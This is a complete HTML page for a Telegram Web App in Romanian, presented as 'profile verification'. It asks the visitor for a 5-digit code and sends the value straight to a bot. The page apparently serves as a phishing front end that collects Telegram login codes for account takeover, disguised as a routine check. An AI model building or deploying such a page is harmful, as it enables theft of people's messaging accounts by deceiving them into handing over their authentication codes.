<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #000; color: #fff; text-align: center; padding-top: 50px; }
        input { width: 80%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; font-size: 18px; margin-bottom: 20px; }
        button { width: 80%; padding: 15px; border-radius: 10px; border: none; background: #248bed; color: #fff; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Verificare Profil</h2>
    <p>Introdu codul de 5 cifre:</p>
    <input type="number" id="cod_input" placeholder="00000">
    <br>
    <button onclick="trimite()">Confirmă</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function trimite() {
            const valoare = document.getElementById('cod_input').value;
            if (valoare.length >= 5) {
                tg.sendData(valoare); // Trimite codul către bot
            } else {
                alert("Introdu 5 cifre!");
            }
        }
    </script>
</body>
</html>
